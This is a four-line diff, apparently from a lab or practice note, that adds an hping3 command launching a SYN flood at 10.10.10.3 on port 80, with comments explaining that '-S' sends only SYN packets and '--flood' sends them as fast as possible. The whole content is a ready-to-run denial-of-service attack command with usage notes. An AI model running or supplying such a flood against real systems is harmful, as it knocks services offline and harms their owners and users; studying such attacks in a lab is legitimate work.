@@ -1,0 +1,4 @@
+sudo hping3 -S --flood  -p 80 10.10.10.3
+
+# '-S' to send just SYN flag 
+# --flood to send request as fast as possible
